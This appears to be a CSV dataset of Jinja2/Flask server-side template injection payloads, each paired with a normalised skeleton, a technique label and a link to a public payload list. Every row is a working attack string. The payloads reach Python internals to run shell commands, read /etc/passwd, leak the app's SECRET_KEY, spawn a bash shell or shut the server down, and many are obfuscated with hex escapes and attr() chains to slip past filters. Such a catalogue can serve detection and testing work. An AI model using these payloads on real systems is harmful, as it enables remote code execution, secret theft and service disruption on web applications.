"{{''.__class__.__mro__[1].__subclasses__()[230]('id',shell=True,stdout=-1).communicate()[0].strip()}}","{{'S'.__class__.__mro__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}","{{'S'.__class__.__mro__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}},{{[].__class__.__base__.__subclasses__()[N]('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}},{{[].__class__.__base__.__subclasses__()[N].__init__.__globals__.__builtins__['S']('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{[].__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}},{{[].__class__.__base__.__subclasses__()[N].__init__.__globals__['S'].modules['S'].popen('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{[].__class__.__base__.__subclasses__()[230]('id',shell=True,stdout=-1).communicate()[0].strip()}}","{{[].__class__.__base__.__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{[].__class__.__base__.__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}","{{[].__class__.__base__.__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{request.__class__._load_form_data.__globals__.__builtins__.open('/etc/passwd').read()}},{{request.__class__._load_form_data.__globals__.__builtins__.open('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{request.__class__._load_form_data.__globals__.__builtins__.__import__('os').popen('id').read()}},{{request.__class__._load_form_data.__globals__.__builtins__.__import__('S').popen('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{request.environ['werkzeug.server.shutdown']()}},{{request.environ['S']()}},python,Jinja2,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}},{{get_flashed_messages.__globals__.__builtins__.open('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read()}},{{get_flashed_messages.__globals__.__builtins__.__import__('S').popen('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{url_for.__globals__['__builtins__']['eval'](""__import__('os').popen('id').read()"")}}","{{url_for.__globals__['S']['S'](""S"")}}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{url_for.__globals__['__builtins__']['exec'](""__import__('os').popen('id').read()"")}}","{{url_for.__globals__['S']['S'](""S"")}}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{url_for.__globals__['__builtins__']['__import__']('os').popen('id').read()}},{{url_for.__globals__['S']['S']('S').popen('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{url_for.__globals__['current_app'].config['SECRET_KEY']}},{{url_for.__globals__['S'].config['S']}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}},{{config.__class__.__init__.__globals__['S'].popen('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['__builtins__'].open('/etc/passwd','r').read()}}{%endif%}{%endfor%}","{%forcin[].__class__.__base__.__subclasses__()%}{%ifc.__name__=='S'%}{{c.__init__.__globals__['S'].open('S','S').read()}}{%endif%}{%endfor%}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['__builtins__'].__import__('os').popen('id').read()}}{%endif%}{%endfor%},{%forcin[].__class__.__base__.__subclasses__()%}{%ifc.__name__=='S'%}{{c.__init__.__globals__['S'].__import__('S').popen('S').read()}}{%endif%}{%endfor%},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='_wrap_close'%}{{c.__init__.__globals__['__builtins__'].open('/etc/passwd','r').read()}}{%endif%}{%endfor%}","{%forcin[].__class__.__base__.__subclasses__()%}{%ifc.__name__=='S'%}{{c.__init__.__globals__['S'].open('S','S').read()}}{%endif%}{%endfor%}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='Popen'%}{{c('id',shell=True,stdout=-1).communicate()}}{%endif%}{%endfor%}","{%forcin[].__class__.__base__.__subclasses__()%}{%ifc.__name__=='S'%}{{c('S',shell=true,stdout=-N).communicate()}}{%endif%}{%endfor%}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{''.__class__.__mro__[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}","{{'S'.__class__.__mro__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{''.__class__.__mro__[1].__subclasses__()[396]('ls -la',shell=True,stdout=-1).communicate()[0].strip()}}","{{'S'.__class__.__mro__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}","{{'S'.__class__.__mro__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}","{{'S'.__class__.__mro__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{''.__class__.__mro__[1].__subclasses__()[396]('uname -a',shell=True,stdout=-1).communicate()[0].strip()}}","{{'S'.__class__.__mro__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{''.__class__.__mro__[1].__subclasses__()[396]('pwd',shell=True,stdout=-1).communicate()[0].strip()}}","{{'S'.__class__.__mro__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{''.__class__.__mro__[1].__subclasses__()[396]('env',shell=True,stdout=-1).communicate()[0].strip()}}","{{'S'.__class__.__mro__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{%print(lipsum|attr('\x5f\x5fglobals\x5f\x5f'))},{%print(lipsum|attr('S'))},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{%print(lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('id')|attr('read')())%},{%print(lipsum|attr('S')|attr('S')('S')|attr('S')('S')|attr('S')())%},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{%print(cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('id')|attr('read')())%},{%print(cycler|attr('S')|attr('S')|attr('S')('S')|attr('S')('S')|attr('S')())%},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{%set chr=lipsum.__globals__.__builtins__.chr%}{{lipsum.__globals__[chr(111)%2bchr(115)].popen('id').read()}},{%setchr=lipsum.__globals__.__builtins__.chr%}{{lipsum.__globals__[chr(N)+chr(N)].popen('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{%set chr=lipsum.__globals__.__builtins__.chr%}{%set cmd=chr(105)%2bchr(100)%}{{lipsum.__globals__.os.popen(cmd).read()}},{%setchr=lipsum.__globals__.__builtins__.chr%}{%setcmd=chr(N)+chr(N)%}{{lipsum.__globals__.os.popen(cmd).read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{lipsum|attr(""__globals__"")|attr(""__getitem__"")(""os"")|attr(""popen"")(""id"")|attr(""read"")()}}","{{lipsum|attr(""S"")|attr(""S"")(""S"")|attr(""S"")(""S"")|attr(""S"")()}}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{cycler|attr(""__init__"")|attr(""__globals__"")|attr(""__getitem__"")(""os"")|attr(""popen"")(""id"")|attr(""read"")()}}","{{cycler|attr(""S"")|attr(""S"")|attr(""S"")(""S"")|attr(""S"")(""S"")|attr(""S"")()}}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{joiner|attr(""__init__"")|attr(""__globals__"")|attr(""__getitem__"")(""os"")|attr(""popen"")(""id"")|attr(""read"")()}}","{{joiner|attr(""S"")|attr(""S"")|attr(""S"")(""S"")|attr(""S"")(""S"")|attr(""S"")()}}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{namespace|attr(""__init__"")|attr(""__globals__"")|attr(""__getitem__"")(""os"")|attr(""popen"")(""id"")|attr(""read"")()}}","{{namespace|attr(""S"")|attr(""S"")|attr(""S"")(""S"")|attr(""S"")(""S"")|attr(""S"")()}}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{request|attr(""application"")|attr(""__globals__"")|attr(""__getitem__"")(""__builtins__"")|attr(""__getitem__"")(""__import__"")(""os"")|attr(""popen"")(""id"")|attr(""read"")()}}","{{request|attr(""S"")|attr(""S"")|attr(""S"")(""S"")|attr(""S"")(""S"")(""S"")|attr(""S"")(""S"")|attr(""S"")()}}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(396)('id',shell=True,stdout=-1)|attr('communicate')()|attr('__getitem__')(0)|attr('strip')()}}","{{'S'|attr('S')|attr('S')|attr('S')(N)|attr('S')()|attr('S')(N)('S',shell=true,stdout=-N)|attr('S')()|attr('S')(N)|attr('S')()}}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{config|attr('__class__')|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}},{{config|attr('S')|attr('S')|attr('S')|attr('S')('S')|attr('S')('S')|attr('S')()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{self|attr('_TemplateReference__context')|attr('cycler')|attr('__init__')|attr('__globals__')|attr('os')|attr('popen')('id')|attr('read')()}},{{self|attr('S')|attr('S')|attr('S')|attr('S')|attr('S')|attr('S')('S')|attr('S')()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{''['\x5f\x5fclass\x5f\x5f']['\x5f\x5fmro\x5f\x5f'][1]['\x5f\x5fsubclasses\x5f\x5f']()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}","{{'S'['S']['S'][N]['S']()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,high,introspection,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{lipsum['\x5f\x5fglobals\x5f\x5f']['os'].popen('id').read()}},{{lipsum['S']['S'].popen('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{cycler['\x5f\x5finit\x5f\x5f']['\x5f\x5fglobals\x5f\x5f']['os'].popen('id').read()}},{{cycler['S']['S']['S'].popen('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os').popen('id').read()}},{{request['S']['S']['S']['S']('S').popen('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}","{%forxin().__class__.__base__.__subclasses__()%}{%if""S""inx.__name__%}{{x()._module.__builtins__['S']('S').popen('S').read()}}{%endif%}{%endfor%}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""Popen"" in x.__name__ %}{{x('id',shell=True,stdout=-1).communicate()}}{%endif%}{%endfor%}","{%forxin().__class__.__base__.__subclasses__()%}{%if""S""inx.__name__%}{{x('S',shell=true,stdout=-N).communicate()}}{%endif%}{%endfor%}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{%with a=request|attr(""application"")%}{%with b=a|attr(""__globals__"")%}{%with c=b|attr(""__getitem__"")%}{%with d=c(""__builtins__"")%}{%with e=d|attr(""__getitem__"")%}{%with f=e(""__import__"")%}{%with g=f(""os"")%}{%with h=g|attr(""popen"")%}{%with i=h(""id"")%}{%with j=i|attr(""read"")%}{{j()}}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}","{%witha=request|attr(""S"")%}{%withb=a|attr(""S"")%}{%withc=b|attr(""S"")%}{%withd=c(""S"")%}{%withe=d|attr(""S"")%}{%withf=e(""S"")%}{%withg=f(""S"")%}{%withh=g|attr(""S"")%}{%withi=h(""S"")%}{%withj=i|attr(""S"")%}{{j()}}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}{%endwith%}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{%set x=lipsum|attr(""\x5f\x5fglobals\x5f\x5f"")%}{%set y=x|attr(""\x5f\x5fgetitem\x5f\x5f"")%}{%set z=y(""os"")%}{%set a=z|attr(""popen"")%}{%set b=a(""id"")%}{%set c=b|attr(""read"")%}{{c()}}","{%setx=lipsum|attr(""S"")%}{%sety=x|attr(""S"")%}{%setz=y(""S"")%}{%seta=z|attr(""S"")%}{%setb=a(""S"")%}{%setc=b|attr(""S"")%}{{c()}}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}},{{().__class__.__bases__[N].__subclasses__()[N].__init__.__globals__.__builtins__['S']('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{().__class__.__bases__[0].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}","{{().__class__.__bases__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{"""".__class__.__bases__[0].__subclasses__()[40](""/etc/passwd"").read()}}","{{""S"".__class__.__bases__[N].__subclasses__()[N](""S"").read()}}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{"""".__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}","{{""S"".__class__.__bases__[N].__subclasses__()[N].__init__.__globals__['S'].modules['S'].popen('S').read()}}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{dict.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}},{{dict.__bases__[N].__subclasses__()[N]('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{dict.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}},{{dict.__bases__[N].__subclasses__()[N].__init__.__globals__.__builtins__['S']('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{dict.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}},{{dict.__bases__[N].__subclasses__()[N].__init__.__globals__['S'].modules['S'].popen('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{dict.__bases__[0].__subclasses__()[230]('id',shell=True,stdout=-1).communicate()[0].strip()}}","{{dict.__bases__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{dict.__bases__[0].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}","{{dict.__bases__[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{%print(''.__class__.__mro__[1].__subclasses__())%},{%print('S'.__class__.__mro__[N].__subclasses__())%},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{%print(lipsum.__globals__)%},{%print(lipsum.__globals__)%},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{%print(cycler.__init__.__globals__)%},{%print(cycler.__init__.__globals__)%},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{%print(request.environ)%},{%print(request.environ)%},python,Jinja2,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{%print(config.items())%},{%print(config.items())%},python,Jinja2,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{x.__init__.__globals__['__builtins__']['eval']('__import__(""os"").popen(""id"").read()')}}",{{x.__init__.__globals__['S']['S']('S')}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{lipsum.__globals__['__builtins__']['eval']('__import__(""os"").popen(""id"").read()')}}",{{lipsum.__globals__['S']['S']('S')}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{lipsum.__globals__['__builtins__']['exec']('import os;os.popen(""id"").read()')}}",{{lipsum.__globals__['S']['S']('S')}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{lipsum.__globals__.__builtins__.eval('__import__(""os"").popen(""id"").read()')}}",{{lipsum.__globals__.__builtins__.eval('S')}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{lipsum.__globals__.__builtins__.exec('import os;print(os.popen(""id"").read())')}}",{{lipsum.__globals__.__builtins__.exec('S')}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{cycler.__init__.__globals__.__builtins__.eval('__import__(""os"").popen(""id"").read()')}}",{{cycler.__init__.__globals__.__builtins__.eval('S')}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{cycler.__init__.__globals__.__builtins__.exec('import os;print(os.popen(""id"").read())')}}",{{cycler.__init__.__globals__.__builtins__.exec('S')}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{joiner.__init__.__globals__.__builtins__.eval('__import__(""os"").popen(""id"").read()')}}",{{joiner.__init__.__globals__.__builtins__.eval('S')}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{{namespace.__init__.__globals__.__builtins__.eval('__import__(""os"").popen(""id"").read()')}}",{{namespace.__init__.__globals__.__builtins__.eval('S')}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{%import os%}{{os.popen('id').read()}},{%importos%}{{os.popen('S').read()}},python,Jinja2,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{%import subprocess%}{{subprocess.check_output('id',shell=True)}}","{%importsubprocess%}{{subprocess.check_output('S',shell=true)}}",python,Jinja2,1,high,uncertain,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{%import pty%}{{pty.spawn('/bin/bash')}},{%importpty%}{{pty.spawn('S')}},python,Jinja2,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{''.__class__.__mro__[1].__subclasses__()[396].__init__.__globals__['sys'].modules['os'].popen('id').read()}},{{'S'.__class__.__mro__[N].__subclasses__()[N].__init__.__globals__['S'].modules['S'].popen('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{''.__class__.__mro__[1].__subclasses__()[230].__init__.__globals__['sys'].modules['os'].popen('id').read()}},{{'S'.__class__.__mro__[N].__subclasses__()[N].__init__.__globals__['S'].modules['S'].popen('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
